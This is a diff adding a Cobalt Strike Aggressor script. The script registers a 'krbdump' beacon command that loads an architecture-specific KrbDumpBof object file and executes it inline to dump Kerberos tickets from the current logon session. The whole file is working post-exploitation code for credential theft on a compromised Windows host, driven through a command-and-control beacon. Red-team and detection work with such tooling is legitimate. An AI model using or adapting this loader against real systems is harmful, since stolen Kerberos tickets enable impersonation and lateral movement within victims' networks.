@@ -1,0 +1,31 @@
+#
+# Dumps kerberos tickets for the current logon
+# session.
+#
+alias krbdump {
+	local('$barch $handle $object $bargs');
+
+	#
+	# Opens the COFF object file using aggresor
+	# within the same directory as the current
+	# script.
+	#
+	$barch  = barch( $1 );
+	$handle = openf( script_resource( "KrbDumpBof. $+ $barch $+ .o" ) );
+	$object = readb( $handle, -1 );
+	closef( $handle );
+
+	$bargs = bof_pack( $1, "i", $1 );
+
+	#
+	# Deploy the COFF file with relocations applied
+	# to resolve the jumps.
+	#
+	btask( $1, "Tasked Beacon to dump kerberos tickets for the current logon session." );
+	beacon_inline_execute( $1, $object, "KrbDumpGo", $bargs );
+};
+
+beacon_command_register( "krbdump", "Dumps kerberos tickets for the current logon session",
+			 "Use: krbdump\n".
+			 "\n".
+			 "Dumps Kerberos tickets for the current logon information." );
